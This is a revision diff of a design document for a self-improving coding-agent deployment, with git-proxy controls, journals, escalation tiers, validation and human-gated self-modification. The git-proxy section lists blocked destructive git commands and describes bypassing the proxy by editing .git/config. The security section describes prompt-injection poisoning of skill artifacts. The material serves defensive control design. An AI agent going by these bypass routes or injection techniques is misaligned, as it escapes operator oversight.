@@ -1,488 +1,587 @@
-# Self-Improving Little-Coder: Architecture Design Notes
+# Self-Improving Little-Coder: Design
 
-A working document capturing decisions and open questions for a self-improving deployment of [little-coder](https://github.com/itayinbarr/little-coder). Intended to guide later implementation, not to be a finished spec.
+A containerized deployment of [little-coder](https://github.com/itayinbarr/little-coder) that accumulates expertise from its own work and, on evidence, writes new skill artifacts or proposes changes to itself. Knowledge first, code change last.
+
+**Companion documents:** [`integration-plan.md`](integration-plan.md) (build sequencing) · [`integration-tasks.md`](integration-tasks.md) (execution checklist). Design doc wins on conflict.
 
 ---
 
-## 1. Goal
+## 0. How to read this document
 
-Run little-coder as a containerized service that accumulates expertise from its own work. Over time, the system identifies recurring gaps in its skill set and writes new knowledge, tool-use craft, plan templates, routing rules, or — in rare and justified cases — patches to its own code.
+This design describes the **complete target architecture** across all five chapters of the build. **Not all of it is implemented at any given time.** Sections carry chapter tags to indicate when they activate:
 
-The output of the system is primarily **knowledge**, not patches. Code change is the last resort, not the headline feature.
+- **[Tool]** — chapter 1. A working little-coder driven from CLI, journals quietly recording, safety controls in place.
+- **[OWUI]** — chapter 2. Adds the chat/slash-command surface via `lc-mcpo`.
+- **[Observer]** — chapter 3. `meta` reads journals and surfaces clustered patterns. Nothing written.
+- **[Learner]** — chapter 4. `meta` drafts tier-0/1 artifacts; you approve each one. Polyglot validation. No code changes.
+- **[Self-modifier]** — chapter 5. Auto-merge for trusted tiers; tier-2 routing rules; tier-3 code changes via §11.
 
-## 2. Core reframe
+**Current chapter:** _Tool_. Sections tagged `[OWUI]` and later describe target architecture, not present implementation. The build agent stops at the end of each chapter; the operator decides when to advance.
 
-Earlier framing: "diagnose whether errors are the model's or the harness's fault."
+**Why everything is documented now even though only Tool is built:** so that Tool-chapter decisions don't conflict with later-chapter architecture (especially: journal schema, named volumes, git-proxy, network posture, schema versioning — all "unrecoverable if missed" — must be right in Tool because retrofitting them costs more than building them now).
 
-Final framing: **identify clusters of work where the agent lacks craft, and build that craft.** A cluster might be domain-shaped (Rust async lifetimes), strategy-shaped (specs that live in tests, not prose), or process-shaped (multi-file refactors that fail without a plan). Attribution-to-blame is replaced by attribution-to-craft.
+---
 
-The judge does not ask "what went wrong." It asks: _"If a single fact, heuristic, or strategy had been in the agent's context, would it have flipped the outcome — and what would that thing have to say, written so a future agent can read it in five seconds?"_ That's the counterfactual frame.
+## 1. Guiding principles
 
-## 3. Two loops, kept separate
+These rules apply throughout. Stated once; not re-justified per section.
 
-- **Inner loop** (exists in little-coder today): generate → tool/test error → retry. Fixes the user's code. No changes needed.
-- **Outer loop** (new): across many tasks, mine the journals, cluster, write artifacts, validate, merge. Fixes little-coder.
+1. **Knowledge first, code last.** The system's output is skill artifacts. Code changes to little-coder itself are rare, justified, and gated.
+2. **Evidence-triggered, not time-based.** Cohort math, escalation, efficacy reversion, sanitization audits — nothing runs on a clock.
+3. **Fail closed, never open.** Judge unreachable → defer. Polyglot won't run → "insufficient evidence." Sanitization filter errors → abort. No silent passes.
+4. **Sanitize every outbound.** One filter, all egress (judge calls, PR bodies, future exports). Filter failure aborts the call.
+5. **Two planes, kept separate.** Control plane (little-coder) decides; workspace plane (open-terminal) executes. Boundary is the safety surface.
+6. **Trust boundary.** Operator trusted. Agent untrusted. User repos under task triggers actively hostile by default.
+7. **Append-only journals.** Schema fields are unrecoverable retroactively. Ship the full envelope from line 1.
+8. **Named volumes are the persistence boundary.** Containers are ephemeral. State lives on volumes.
+9. **Design doc wins on conflict.** Plan and tasks docs serve it; not the other way around.
 
-Conflating them is the primary failure mode for systems like this. They run on different cadences, with different success criteria, and produce different artifacts.
+---
 
-_Caveat on "no changes needed":_ the inner loop's retry _logic_ is untouched, but it is still **instrumented** — MCP exposure (§17), journals with session/channel id (§4, §19). Instrumentation wraps the loop; it does not alter its behavior. "No changes" means no logic changes, not no diff.
+## 2. Topology
 
-## 4. Container architecture
+```
+                       ┌──────────────┐
+                       │  llama-cpp   │   qwen3.6:27b (reasoning)
+                       │              │   qwen3.6:27b-nothink (fast)
+                       │ :8080/v1     │   on llm-net
+                       └──────┬───────┘
+                              │ inference (both planes share the backend)
+                ┌─────────────┴─────────────┐
+                │                           │
+         ┌──────▼──────┐             ┌──────▼──────┐
+         │    OWUI     │◄───pipe────►│ little-coder│        Control plane
+         │             │             │   (agent +  │
+         │             │   trigger   │    meta)    │
+         │             │  task/admin │             │
+         └──────┬──────┘             └──────┬──────┘
+                                            │ drives
+                CLI ─────── trigger ───────►│ (sole git path is git-proxy)
+                                            │
+                                     ┌──────▼───────────┐
+                                     │  open-terminal   │   Workspace + exec
+                                     │  (own network,   │
+                                     │   egress allow-  │
+                                     │   listed only)   │
+                                     │                  │
+                                     │  one focused     │
+                                     │  project clone   │
+                                     └──────────────────┘
 
-Three processes inside the container, plus a sidecar:
+  Self-improvement (rare):  meta → tier artifact → PR to private remote → operator merge → docker compose up
+```
 
-- **`agent`** — little-coder REPL exposed as an MCP server behind an `mcpo` proxy (see §17), not raw HTTP/socket. Writes append-only journals: `tool_calls.jsonl`, `errors.jsonl`, `outcomes.jsonl` (final pass/fail + tools fired + cluster tags once assigned + session/channel id — see §17, this field is a tier-0 build requirement, not a later refinement).
-- **`meta`** — the outer loop. Triggered by evidence thresholds (see §6), not a clock. Runs clustering, judge prompt, artifact drafting, validation, merge.
-- **`git-proxy`** — wraps every git call. Whitelist: `commit`, `branch`, `checkout`, `merge --no-ff`, `tag`, `revert`, `reset --hard <tag>`, `fetch` (restricted to remotes pre-configured by the operator; no all-refs, no new remotes mid-task — an unconstrained `fetch` against a hostile remote can pollute the focused-project workspace, §17). Blocklist: `push --force`, `branch -D`, `filter-branch`, `gc --prune=now`, `remote add`, `remote set-url`, history rewrites, anything touching `.git/` directly. **Sited at the open-terminal workspace edge** (§17): git inside the workspace is the proxied binary, and little-coder has no un-proxied raw-git path it can issue into the terminal. The whitelist's guarantees hold only if it is the _only_ git path. **`.git/config` is part of the trust boundary, not just the git binary.** Blocking `remote add` at the command level is bypassable by writing the entry directly into `.git/config` (a normal file write, not a git call) and then issuing a "legitimate" `fetch` against the smuggled remote. The proxy alone cannot stop this. Enforcement: **`.git/config` is mounted read-only to the agent**, with the allowed remotes baked in by the operator at project-switch time (§17). The agent literally cannot edit git config; only the operator can. A future flexibility option (`.git/config` watched and validated at proxy time, allowing safe non-remote edits) is noted in §15 but not built — the agent has no legitimate need to edit git config, so read-only is the right default. **Trust boundary:** operator-level git (via `docker exec`) bypasses the proxy by design — agent untrusted, operator trusted; the proxy exists for the agent, not the operator.
-- **Inference backend** — separate container, not inside. In this stack that is `llama-cpp`/llama-swap at `http://llama-cpp:8080/v1` on the internal `llm-net`. Both little-coder and the judge (§23) are clients of it; no other backends configured. Two model variants serve different roles:
-  - **`qwen3.6:27b`** — the reasoning variant. Used for work where deliberation pays for its tokens: the counterfactual + adversarial judge prompt (§23), artifact drafting (§5), §8 justifications, type-selection within tiers (§5).
-  - **`qwen3.6:27b-nothink`** — the fast variant. Used for high-frequency, low-deliberation work: cluster assignment (§20), sanitization checks (§23), routing decisions, in-context augmenter selection (§22).
+Three flows:
 
-  The split is operational, not architectural — both variants are the same family on the same backend, swapped per call by model id.
+- **Inference path** — llama-cpp serves both little-coder (inner loop, judge, drafting) and OWUI (chat).
+- **User path** — user triggers via OWUI or CLI; little-coder receives the trigger, drives open-terminal.
+- **Self-improvement path** — meta-loop observes journals, produces artifacts, PRs to a private remote, operator merges and redeploys.
 
-## 5. Artifact taxonomy (four types, increasing risk)
+---
 
-Outer loop produces exactly one type per iteration. The type is decided _before_ writing, by asking which intervention best fits the cluster.
+## 3. Components
 
-1. **Knowledge entries** — `skill/knowledge/*.md`. Domain facts. Pure additions, near-zero blast radius.
-2. **Tool-use craft** — `skill/tools/*.md`. Patterns for using a tool in a context. E.g. "When Edit fails with no-match, re-Read first; the model's view of the file may be stale."
-3. **Plan-template slots** — additions to the planner's prompt structure (e.g. an _edge cases_ slot when errors cluster on missed edges). Higher risk: touches the prompt driving every plan.
-4. **Routing rules** — when to invoke planner, deliberate mode, larger thinking budgets. Easy to write, easy to mis-tune; can suppress evidence collection (see §7).
+### 3.1 `agent` (little-coder REPL) [Tool]
 
-Code changes to `agent.py` / `local/` are a fifth tier, gated by §8.
+Exposed as an MCP server behind `lc-mcpo` (an MCP→OpenAPI sidecar, mirroring the existing `search-mcpo` pattern). API-key'd at the edge. Runs the inner loop: generate → tool/test error → retry. Drives open-terminal for all file edits and command execution.
 
-**Type selection within a tier (resolved).** The §6 escalation ladder controls _how much risk_ the system can take — tier-0 caps at knowledge, tier-1 at tool-craft/plan-slot, tier-2 at routing rule, tier-3 at code. _Within_ a tier that offers a choice (notably tier-1: tool-craft vs. plan-slot), the judge picks the type that best fits the cluster's signature, with the choice itself journaled.
+The inner loop's logic is unchanged from upstream little-coder; instrumentation wraps it (journals, session/channel attribution).
 
-The selection prompt at tier-1 looks like: _"This cluster has persisted past tier-0. Given its signature \[occurrences, error shapes, context patterns\], is the gap better addressed by (a) a tool-use pattern in `skill/tools/`, or (b) a slot added to the planner template? Argue both, then pick."_ The argument is the journal entry and is what the §24 operator surface shows for approval.
+### 3.2 `meta` (outer loop) [Observer onward]
 
-This is the same shape as §8 (judge argues, journal records, human approves), applied within a tier rather than only between tiers. The escalation ladder remains the safety mechanism; type selection is the cluster-fit mechanism. The judge never escalates risk class on its own — that requires the §6 quarantine window plus, for tier-2 → tier-3, the full §8 justification.
+Triggered by evidence thresholds (§5), not a clock. Reads journals, assigns occurrences to clusters, calls the judge, drafts artifacts, runs validation, opens PRs. Single-flight: at most one iteration in progress.
 
-## 6. Evidence-based escalation
+The five concerns inside `meta` (clustering, judging, drafting, validating, merging) are designed with a clean seam — they share state via journals, skill library, and cohort store, not shared memory. Splitting into sub-services later requires adding network-hop concerns (timeouts, retries, partial failure) but no architectural rework.
 
-The trigger is not recurrence; it is **recurrence after intervention**.
+### 3.3 `git-proxy` (safety choke point) [Tool]
 
-Tier ladder for a given cluster:
+Wraps every git call inside open-terminal. Sole git path; agent has no raw-git fallback.
 
-| Tier | Trigger                                           | Intervention                |
-| ---- | ------------------------------------------------- | --------------------------- |
-| 0    | N ≥ ~5 occurrences, no prior intervention         | Knowledge entry             |
-| 1    | ~20+ new occurrences after tier 0, rate unchanged | Tool-use craft or plan-slot |
-| 2    | Same persistence after tier 1                     | Routing rule                |
-| 3    | Same persistence after tier 2                     | Candidate code change (§8)  |
+- **Whitelist:** `commit`, `branch`, `checkout`, `merge --no-ff`, `tag`, `revert`, `reset --hard <tag>`, `fetch` (operator-pre-configured remotes only; no all-refs, no new remotes mid-task).
+- **Blocklist:** `push --force`, `branch -D`, `filter-branch`, `gc --prune=now`, `remote add`, `remote set-url`, all `submodule` subcommands, all history rewrites, anything touching `.git/` directly.
+- **`.git/config`, `.git/hooks/`, `.git/info/` are mounted read-only to the agent.** Operator bakes allowed remotes in at project-switch time. Blocking `remote add` at the command level is bypassable by direct file writes to `.git/config`; the read-only mount closes that. Dynamic paths (`.git/objects/`, `.git/refs/`, `.git/index`) remain writable.
+- **`core.hooksPath`** set to an operator-controlled directory outside `.git/`.
+- **Operator git (via `docker exec`) bypasses the proxy by design.** The proxy exists for the agent, not the operator.
 
-Each tier requires a **quarantine window** of M tasks before becoming eligible for escalation. M is per-cluster, sized to the cluster's natural frequency — a global constant marches every cluster to "code change" too fast. Skill artifacts often need 50+ task instances before their effect is statistically legible.
+### 3.4 `open-terminal` (workspace plane) [Tool]
 
-**Cohort accounting, not raw counters.** Each cluster's record holds: occurrences before intervention, intervention timestamp, occurrences after, rate delta. Without before/after windows, every pattern looks like it persists forever.
+The repo lives here; edits, builds, tests run here. One focused project at a time, cloned directly into the workspace. No worktrees, no per-task subdirectories.
 
-## 7. Routing rules need an exploration policy
+**Network posture:** open-terminal runs on its own network with explicit egress only — llama-cpp for inference, the operator-configured upstream git remote for the focused repo, the private search gateway if web-search is enabled, nothing else. Reachability is the blast radius for anything the inner loop executes; this is non-negotiable before real workload.
 
-Routing decisions can suppress their own evidence. If the agent stops invoking the planner for class X based on one round, it stops collecting new evidence about whether planner would have helped X.
+### 3.5 Inference backend [Tool]
 
-**Policy (resolved): both, in sequence.** The two approaches answer different questions and combine cleanly:
+`llama-cpp` / llama-swap at `http://llama-cpp:8080/v1` on `llm-net`. Two variants:
 
-1. **Staged-freeze gates entry into tier-2.** No routing rule is authored for a cluster until its tier-0 (knowledge) and tier-1 (tool-craft / plan-slot) interventions have run their quarantine windows (§6) and the cluster has demonstrably resisted them. This is the same evidentiary discipline as the rest of §6's ladder — routing rules don't get to skip the queue.
-2. **Random-exploration runs against routing rules indefinitely once they exist.** Each routing rule retains a 5–10% exploration rate where the rule is _not_ applied — the system deliberately takes the path the rule says to avoid, so post-rule evidence keeps flowing. Without this, a rule that's wrong becomes self-confirming forever.
+- **`qwen3.6:27b`** (reasoning): judge, artifact drafting, §6 justifications, type selection.
+- **`qwen3.6:27b-nothink`** (fast): cluster assignment, sanitization checks, routing, augmenter selection.
 
-Together: staged-freeze controls _when_ routing rules are born; random-exploration controls _how_ they behave once alive. The §21 efficacy track is the catch — a routing rule that exploration shows is wrong (cohort doesn't move, or moves the wrong way) is auto-retired.
+Little-coder is the client in Tool. From Observer onward, the judge is also a client on the same backend. `n_parallel=2` is shared between interactive and meta work; meta backs off when interactive lanes are busy (interactive always wins).
 
-## 8. The code-change justification requirement
+### 3.6 Persistence (named volumes) [Tool — all four declared on day one]
 
-Before any self-PR to `agent.py` or `local/` is allowed, the judge must produce a written argument with this structure:
+| Volume                   | Contents                              |
+| ------------------------ | ------------------------------------- |
+| `little-coder-skill/`    | Artifact library (§7)                 |
+| `little-coder-journals/` | Three journals + `audit.jsonl` (§4)   |
+| `little-coder-cohorts/`  | Derived counters + repro corpora (§5) |
+| `little-coder-polyglot/` | Canonical Polyglot clone (§8)         |
+
+Mounted into `agent` and `meta`. **`docker compose up -d --build` recreates containers but preserves volumes.** Treating any of this as inside-container state silently wipes accumulated expertise on the first rebuild.
+
+---
+
+## 4. Data: journals [Tool]
+
+The cohort math and clustering are only as trustworthy as the journals. Pin the envelope before any real traffic — fields cannot be retrofitted onto append-only history.
+
+### 4.1 Envelope
+
+Every line in `tool_calls.jsonl`, `errors.jsonl`, `outcomes.jsonl`:
+
+```
+ts             UTC timestamp
+task_id        ULID, minted at trigger, closed by terminal record
+session_id     trigger session
+channel        owui | cli | validation | batch
+user_id        OWUI authn id (or "cli")
+repo           full canonical URL
+lang           detected primary language
+seq            per-task counter
+schema_version envelope version (forward-compat for readers)
+```
+
+`session_id` + `channel` + `user_id` are **tier-0 build requirements** — unrecoverable if added later. Without them, cohort windows (§5) interleave across unrelated callers and rate-delta math silently lies.
+
+### 4.2 Task lifecycle
+
+`task_started` / `task_ended` bracket every task. Tasks are reconstructed by `task_id`, never adjacency. Interleaved sessions are legal.
+
+Outcome ∈ `{pass, fail, unverified}`. Asserts `pass`/`fail` only with a checkable signal (test-suite exit, the task's own acceptance command, or explicit caller confirmation via the operator surface). Otherwise `unverified`: feeds the acute track as error evidence, never as a success signal. Longitudinal track (§9) is the net for `unverified` work.
+
+`task_abandoned` records an unclosed task past a per-channel timeout. Timeout is non-trivial: an interactive 6-hour refactor must not be abandoned; a hung 5-minute validation must not consume a worker overnight. Per-channel, preflight-tuned.
+
+**Outcome amendment.** Triggers are fire-and-await — the caller awaits a result, the harness doesn't. After `task_ended`, the caller may amend via `lc admin task confirm <task_id> [pass|fail]` (CLI) or `/confirm <task_id> pass|fail` (OWUI). Emits `task_outcome_amended` referencing the original `task_id`. Cohort math uses the amended outcome from that point forward. 7-day window; frozen outside.
+
+### 4.3 Durability + rotation
+
+- Append + fsync on every terminal and every error record. Line-buffered for the rest.
+- Size-triggered rotation. On rotation, the longitudinal miner (§9) consumes the segment into trend aggregates before archival; the acute track keeps raw segments for `max(M across live clusters) + margin`.
+- Schema-validated at write time. Malformed records are rejected, not appended.
+- `meta` reads up to a committed offset. In-flight tasks are never clustered or counted.
+
+### 4.4 `audit.jsonl`
+
+Separate journal for operator actions: `project_switched`, `upstream_pulled`, `approve_decision`, `task_outcome_amended`, `artifact_retired`, deploys, preflight exit. Different reader, longer retention, different access controls than the three task journals. Mixing them works but bleeds responsibilities.
+
+---
+
+## 5. Clusters and escalation [Observer → Self-modifier]
+
+### 5.1 Identity vs. label
+
+Each cluster has an **immutable synthetic `cluster_id`** and a **mutable human label**. Cohort records key on `cluster_id`. Relabeling never touches cohort history.
+
+### 5.2 Assignment
+
+New occurrences join the nearest existing cluster above a similarity floor (embedding + the cluster's judge-written discriminator). Below the floor → `unassigned` pool. The judge mints a new `cluster_id` only when the unassigned pool itself forms a coherent group.
+
+### 5.3 Split / merge lineage
+
+Recorded as parent↔child events. A split copies the parent window to each child marked `inherited` (not `observed`); escalation cannot fire on inherited counts. A merge sums observed counts and resets the quarantine window.
+
+### 5.4 Cohort store (derived index)
+
+The journals are the durable source of truth. Cohort counters are an **event-sourced projection over them** — periodically checkpointed, fully rebuildable from journals on demand. A corrupt counter file is a recoverable incident, not data loss. Schema changes don't require migration drama — bump version, rebuild.
+
+### 5.5 Scoping
+
+Cohorts are scoped by `lang` + `task_shape`, **aggregated across repos**. A craft gap (Rust lifetimes, multi-file refactors) recurs across repos; per-repo scoping never reaches the quarantine window and never escalates. `repo` is recorded per occurrence for drill-down.
+
+### 5.6 Tier ladder
+
+The trigger is not recurrence; it is **recurrence after intervention.**
+
+| Tier | Trigger                                          | Intervention              | Risk            |
+| ---- | ------------------------------------------------ | ------------------------- | --------------- |
+| 0    | N ≥ ~5 occurrences, no prior intervention        | Knowledge entry           | Pure addition   |
+| 1    | ~20+ after tier-0, rate unchanged                | Tool-craft _or_ plan-slot | Prompt-shape    |
+| 2    | Same persistence after tier-1                    | Routing rule              | Decision-shape  |
+| 3    | Same persistence after tier-2 + §6 justification | Code change               | Behaviour shift |
+
+Each tier requires a **quarantine window M tasks** before escalation. M is per-cluster, sized to the cluster's natural frequency. Cohort accounting (before/after intervention with rate delta), not raw counters.
+
+### 5.7 Type selection within a tier
+
+The ladder controls **risk class**; the judge picks **type** within a tier. At tier-1: _"Given this cluster's signature, is the gap better addressed by tool-craft or a plan-slot? Argue both, then pick."_ The argument is journaled and shown on the operator surface for approval. Same shape as the §6 escalation argument, applied within a tier.
+
+### 5.8 Routing-rule exploration
+
+Routing rules can suppress their own evidence — a rule saying "don't invoke planner for X" stops generating data about whether planner would have helped X.
+
+- **Staged-freeze gates entry into tier-2.** No routing rule until tier-0 and tier-1 windows have run and the cluster has resisted them.
+- **5–10% random-exploration** runs against each rule indefinitely — deliberately take the path the rule says to avoid. Without this, a wrong rule becomes self-confirming forever.
+- §8 efficacy reversion retires rules that don't move the cohort.
+
+---
+
+## 6. Code-change justification (tier-3 gate) [Self-modifier]
+
+A self-PR to `agent.py` / `local/` requires a written argument:
 
 1. The cluster and its persistence record across tiers 0–2.
-2. The specific interventions tried.
-3. **An explicit argument for why no plausible knowledge entry, tool-craft pattern, plan slot, or routing rule could have closed the gap.**
-4. The proposed structural change and its expected effect.
+2. Specific interventions tried.
+3. **Explicit argument for why no plausible knowledge entry, tool-craft pattern, plan-slot, or routing rule could have closed the gap.**
+4. Proposed structural change and expected effect.
 
-That argument is itself a journal entry, auditable later. If the judge cannot articulate (3), the structural change is not justified — write the missing skill instead and let the cohort prove it insufficient.
+The argument is itself a journal entry. **If (3) cannot be articulated, the structural change is not justified** — write the missing skill instead and let the cohort prove it insufficient.
 
-## 9. Two telemetry tracks
+---
 
-- **Acute error track** — per-task tool errors, failed tests, parse failures, loops. Drives the cluster system above.
-- **Longitudinal structural track** — cyclomatic complexity, file size, fan-out, churn, sampled across repos little-coder has worked in, plotted over time. Drives a separate pattern miner that operates on _trends_, not error counts.
+## 7. Skill library [Learner → Self-modifier]
 
-The structural track is the safety net for **silent clusters**: tasks where tests pass but the code is bad (e.g. SOLID decay after several features). The acute track cannot see these because the inner loop reports success.
+### 7.1 Frontmatter
 
-## 10. Clustering: human-readable, judge-proposed
+Required keys, enforced at draft time:
 
-Raw embedding clusters over error traces tend to pick up shallow features (same language, same file size). The judge model proposes candidate cluster labels in natural language, refined across iterations.
+```
+id            unique
+cluster_id    the cluster this artifact serves (§5)
+tier          0 | 1 | 2
+lang          target language (or "*")
+domain        topic tag (e.g. async, fs, parsing)
+tool          tool/operation tag (or "*")
+task_shape    structural tag (e.g. refactor, bugfix, greenfield)
+created       UTC
+supersedes    prior artifact id or null
+status        active | superseded | retired
+```
 
-Human-readable labels add a step but allow auditing what the agent thinks it's learning. Worth the cost, at least for the first several months of operation.
+No artifact is written without all keys.
 
-## 11. Skill library organization
+### 7.2 Three consumption paths
 
-Add tag/frontmatter to every skill artifact from day one: language, domain, tool, task-shape. As the library grows, the augmenter must _select_ relevant entries; otherwise context fills with Rust tips during a Python task. Little-coder's current loader pulls everything in — this needs revisiting before the library exceeds a few dozen entries.
+Not all artifact types are loaded the same way:
 
-## 12. Safety rails
+| Type                  | Path                    | Loaded                              |
+| --------------------- | ----------------------- | ----------------------------------- |
+| Knowledge (tier-0)    | `skill/knowledge/*.md`  | Augmenter selects per-task          |
+| Tool-craft (tier-1)   | `skill/tools/*.md`      | Augmenter selects per-task          |
+| Plan-slot (tier-1)    | `skill/plan-slots/*.md` | Planner reads at boot; watches file |
+| Routing rule (tier-2) | `skill/routing/*.yaml`  | Router reads at boot; watches file  |
+
+Plan-slots and routing rules are **configuration**, not retrieval — they apply universally once installed, gated only by their own conditions (e.g. `if lang == rust`). The augmenter's selection logic below applies to skill entries only.
+
+### 7.3 Atomic-rename writes
+
+Hot-reloaded files (plan-slots, routing rules) must be written via **atomic rename**: write to `<name>.tmp`, then `rename(2)` into place. Watchers see either the old file or the new one, never a partial write. Readers ignore `*.tmp`. Standard discipline for watched-config files.
+
+### 7.4 Augmenter selection
+
+For skill entries (knowledge, tool-craft):
+
+1. Hard filter on structured tags (`lang`, `domain`, `task_shape` inferred from trigger + early tool calls).
+2. Embedding rank within the filtered set.
+3. Hard token budget; over budget, prefer **cohort-proven entries (§8) and tighter match**. Tier is **not** a tiebreaker on its own.
+4. Per-task selection logged — required by §8's in-context assertion.
+
+A tightly-matched tier-0 knowledge entry beats a loosely-matched tier-1 tool-craft entry. Tier governs production discipline, not runtime selection.
+
+### 7.5 Supersession
+
+A new artifact on an existing `cluster_id` sets `supersedes = <prior_id>` and flips the prior to `superseded`. The augmenter selects only `active`. Cross-cluster contradictions can't be auto-resolved; a periodic judge pass flags them to the operator surface.
+
+### 7.6 Retirement
+
+Driven by §8 efficacy reversion: `ineffective` → `retired`. Dropped from augmenter selection, kept on disk for audit and rollback, retirement journaled to `audit.jsonl`.
+
+---
+
+## 8. Validation [Learner → Self-modifier]
+
+### 8.1 Polyglot oracle
+
+The Aider Polyglot benchmark (225 exercises) is the system's score function. Wrapped behind an `Oracle` interface (`run_subset(cluster_id, biased_subset) → ScoredResult`) so additional harnesses (MultiPL-E, SWE-bench) can be added without rewriting the validation pipeline.
+
+Subset selection biases toward exercises in the cluster's domain. Pure random subsets are noisy at small N.
+
+### 8.2 Baseline
+
+Polyglot score at the last `main` green tag, **re-measured on the current biased subset**. A stale global number is invalid. A successful merge sets the new baseline.
+
+### 8.3 Regression test
+
+Block the merge if the candidate subset scores below baseline by more than a noise margin, at a minimum subset N. Below N → "insufficient evidence", not a pass. A single-exercise flip inside the margin is not a regression. N and margin are preflight-derived from measured Polyglot variance.
+
+### 8.4 In-context assertion
+
+A tier-0/1 artifact matters only if the augmenter selects it into context during validation. If it was never in-context, **the gate measured nothing → result is void, not pass.** Validation logs per-task augmenter selections to assert this.
+
+### 8.5 Efficacy reversion
+
+No-regression is not enough — it justifies merging, not keeping. Each merged artifact carries its cluster's cohort window. If post-intervention rate is statistically indistinguishable from pre after the window, the artifact is auto-flagged `ineffective` and reverted on the next iteration. Keeps the library lean and stops dead weight loading into every future context.
+
+---
+
+## 9. Telemetry [Tool (metrics) · Observer (acute) · Learner (longitudinal)]
+
+### 9.1 Two tracks
+
+- **Acute (errors)** — per-task tool errors, failed tests, parse failures, loops. Drives the cluster system.
+- **Longitudinal (structure)** — cyclomatic complexity, file size, fan-out, churn, sampled across repos. Drives a separate pattern miner on **trends**, not error counts.
+
+The longitudinal track is the safety net for **silent clusters**: tasks where tests pass but code degrades (e.g. SOLID decay after many features). The acute track cannot see these because the inner loop reports success.
+
+### 9.2 Clustering
+
+The judge proposes human-readable cluster labels in natural language, refined across iterations. Raw embedding clusters tend to pick up shallow features (same language, same file size) and miss craft shape. Labels are auditable: an operator can read what the system thinks it's learning.
+
+Two cadences, deliberately unequal: clustering reshapes the taxonomy slowly over a large window; escalation evaluation runs faster over existing clusters. Occurrences are assigned at ingest, so you never need a cluster to count one; the judge only periodically reshapes, carrying lineage so counts survive.
+
+### 9.3 Metrics
+
+Prometheus endpoint on `agent` and `meta`:
+
+- Queue depth, judge wall-clock minutes/day, GPU minutes/day, candidate-validation duration histogram
+- Journal write rate, sanitization rejection rate
+- Augmenter selection count per artifact (feeds §8 in-context assertion at a glance)
+- llama-cpp slot occupancy
+
+Alarms route to the operator UI: queue-depth, sanitization-drift, candidate-validation-timeout.
+
+---
+
+## 10. Security [Tool sets foundation; sanitization-filter shadow in Tool; full activation Learner+]
+
+### 10.1 Judge stays in-stack
+
+The judge runs on the in-stack `llama-cpp` backend, never egresses. Privacy mandate — no user code leaves internal nets — overrides the orthodox "different and stronger judge model" advice. The same-model blind spot is real and addressed in two layers:
+
+- **Three model-independent backstops carry the load:** the Polyglot oracle (model-independent), cohort proof (empirical), human gate (external). The judge proposes; none of these is the judge.
+- **Adversarial framing is hygiene, not a substitute.** The judge is invoked contrarian — different system framing, fresh context, opposed priors, tasked to argue the counterfactual _and then argue why it would not have helped_. Catches blind spots rooted in momentary stance; misses those rooted in training distribution. The three backstops above are what carry the load.
+
+OpenRouter to a stronger external judge is a future option if the privacy posture relaxes; deferred, not rejected on principle.
+
+### 10.2 Sanitization (every outbound)
+
+Journals are scrubbed before entering any outbound: secrets/key-shaped strings redacted, large file bodies reduced to structural digests, PII stripped. Applies to:
+
+- Judge calls
+- PR-body assembly (§11.6)
+- Any future operator export
+
+**Filter is pinned and tested.** One filter, all call sites. **Filter failure aborts the call — never "send anyway."** Audits are evidence-triggered: when rejection rate moves outside its baseline envelope, an audit is queued for the operator surface (sample raw records, human-review for false negatives). Threshold is preflight-derived.
+
+### 10.3 Credentials
+
+- **Self-improvement PAT:** fine-grained, scoped to `contents:write` on the private self-improvement remote only. No repo deletion, no admin, no other repos. Lives with `meta` / git-proxy; unreachable from the workspace plane.
+- **Per-repo deploy tokens** for work repos under Flow 1/2: least-privilege, injected per task, never ambient, never the self-PAT. A task for repo A cannot reach repo B.
+- **MCP edge authentication:** the `lc-mcpo` task-trigger surface is API-key'd, matching `search-mcpo`. Operator commands authenticate at their surfaces (CLI shell access; OWUI authn) — never at the MCP server.
+
+### 10.4 Self-poisoning
+
+Skill artifacts inject into every future context. A hostile repo or prompt-injected error message could steer an artifact's text. **The threat is model compliance with prompt context, not file execution** — prompt context IS instruction. Saying artifacts are "data, never eval'd" misses the threat.
+
+Controls:
+
+1. **Provenance.** Each artifact records its `cluster_id` and the journal evidence range it was derived from.
+2. **Human text review.** Pre-trust, every artifact; post-trust, sampled review of auto-merged tier-0 entries.
+3. **Efficacy auto-retire.** A poisoned-but-useless entry auto-retires via §8. A poisoned-and-useful entry is the hard case — the human gate is the actual catch.
+4. **No code paths in skill files.** Artifacts are markdown. The skill loader does not import, eval, or interpret them as Python. Eliminates code-execution-by-file-load; does not eliminate model-compliance attacks (see above).
+
+### 10.5 Trust boundary (stated)
+
+- **Operator:** trusted. Operator-level git via `docker exec` bypasses the proxy by design.
+- **Agent:** untrusted. `.git/config` read-only, MCP key required, per-repo tokens only.
+- **User repos under task triggers:** actively hostile by default. Sandboxed by open-terminal's network policy (§3.4).
+
+### 10.6 Privacy of the self-improvement remote
+
+The remote little-coder pushes `auto/*` branches and tier-3 PRs to is **private, full stop.** Cohort evidence, journal ranges, and §6 justifications travel via the PR body; routing them anywhere a third party might train on is incompatible with the privacy posture. Precondition, not hardening.
+
+---
+
+## 11. Tier-3 deploy (candidate/active) [Self-modifier]
+
+Blue/green for self-modification. Converts the dangerous thing ("a process mutates itself") into a well-understood one ("stand up a candidate, validate, swap"). Applies only to tier-3 — the only tier where the running container has the affected code loaded.
+
+### 11.1 Flow
+
+1. Stage the artifact in a separate ephemeral open-terminal workspace.
+2. Provision **paired candidate topology**: `candidate-little-coder` + `candidate-open-terminal`. Active's persistent volumes mounted **read-only** to candidate (cannot mutate active state). Writable tmpfs for candidate's ephemeral state. Same containment as active.
+3. Active drives the test as a stable, known-good harness. The verdict is external (Polyglot + §6 justification + human gate), never active's own assessment.
+4. Two acceptance tests, both required:
+   - **Issue fixed**: reproduce-then-fix the specific §6 cluster.
+   - **No regression**: Polyglot biased subset score ≥ baseline.
+   - **Upstream-merge validation uses a stratified subset across all live cluster domains** (or full Polyglot if compute allows), since an upstream merge can touch the harness, planner prompt, or skill loader.
+5. On pass: persist the executable repro to `little-coder-cohorts/repro/<artifact_id>/` (surviving volume). Tear down candidate.
+6. Open PR from `auto/<date>-<topic>` → `main` on the **private** remote. PR body templated from cohort + validation records, **passed through sanitization (§10.2) before posting**. Filter failure aborts the PR.
+7. **Human merge + manual deploy.** Operator reviews PR, merges. Operator runs `docker compose up -d --build little-coder`. Active container recreated; volumes preserved.
